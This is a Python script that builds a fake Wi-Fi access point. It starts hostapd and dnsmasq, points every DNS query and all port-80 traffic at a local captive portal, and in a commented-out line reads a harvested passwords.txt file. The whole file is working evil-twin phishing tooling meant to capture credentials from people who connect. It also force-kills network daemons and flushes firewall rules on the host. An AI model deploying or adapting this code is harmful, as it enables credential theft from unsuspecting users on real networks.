import os


def reset_setting():
    # os.system('service NetworkManager start')
    # os.system('service apache2 stop')

    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system('systemctl unmask systemd-resolved >/dev/null 2>&1')
    os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl start systemd-resolved >/dev/null 2>&1')
    os.system('sudo iptables -F')
    os.system('sudo iptables -t nat -F')



def AP_on(iface):
    # os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    # os.system('systemctl stop systemd-resolved >/dev/null 2>&1')
    # os.system('service NetworkManager stop')
    os.system('systemctl stop systemd-resolved >/dev/null 2>&1')
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl mask systemd-resolved >/dev/null 2>&1')
    os.system(' pkill -9 hostapd')
    os.system(' pkill -9 dnsmasq')
    os.system(' pkill -9 wpa_supplicant')
    os.system(' pkill -9 avahi-daemon')
    os.system(' pkill -9 dhclient')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')

    os.system("ifconfig " + iface + " 10.0.0.1 netmask 255.255.255.0")
    os.system('route add default gw 10.0.0.1')

    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    os.system('sudo iptables -t nat -A  POSTROUTING -o eth0 -j MASQUERADE')
    os.system('sudo iptables -t nat -I PREROUTING -d 10.0.0.1 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:8080')
    # os.system('iptables -P FORWARD ACCEPT')


### Create the hostapd configuration file.
def hostapd_conf(interface, essid):
    setup = "interface=" + interface + "\nssid=" + essid + "\ndriver=nl80211\nchannel=7\nhw_mode=g"
    ### If this file is exists, we delete it.
    try:
        os.remove("hostapd.conf")
    except:
        pass
    ### Create and write the hostapd configuration file.
    hostapd = open("hostapd.conf", "w+")
    hostapd.write(setup)
    # os.chmod("hostapd.conf", 0o777)

#
# ### Create the hostapd configuration file.
# def dhcpcd_conf(interface, essid):
#     setup = "interface " + interface + "\n\tstatic ip_address=10.0.0.1/24\n\tnohook wpa_supplicant"
#     ### If this file is exists, we delete it.
#     try:
#         os.remove("dhcpcd.conf")
#     except:
#         pass
#     ### Create and write the hostapd configuration file.
#     hostapd = open("dhcpcd.conf", "w+")
#     hostapd.write(setup)
#     # os.chmod("hostapd.conf", 0o777)


### Create the dnsmasq configuration file

def dnsmasq_conf(interface):
    setup = "interface=" + interface + "\ndhcp-range=10.0.0.10,10.0.0.100,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6," \
                                       "10.0.0.1\naddress=/#/10.0.0.1\n "
    # Set the range of the IP address allocations, and the time limit for each allocation.
    # Set the gateway address of the fake AP (3 stand for gateway address).
    # Set the DNS server address of the fake AP (6 stand for DNS server address).
    # Set the IP address of the fake AP. All queries will be sent to this address.
    ### If this file is exists, we delete it.
    try:
        os.remove("dnsmasq.conf")
    except:
        pass
    ### Create and write the hostapd configuration file.
    dnsmasq = open("dnsmasq.conf", "w+")
    dnsmasq.write(setup)
    # os.chmod("dnsmasq.conf", 0o777)


def run_AP():
    os.system('dnsmasq -C dnsmasq.conf')
    os.system('gnome-terminal -- sh -c "cd captive_portal && npm start"')
    os.system('hostapd hostapd.conf -B')
    os.system('route add default gw 10.0.0.1')



def start(iface):
    reset_setting()
    AP_on(iface)
    hostapd_conf(iface, "AAA")
    dnsmasq_conf(iface)
    run_AP()
    input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
    reset_setting()
    # os.system("clear")
    # os.system("cat /var/www/html/passwords.txt")
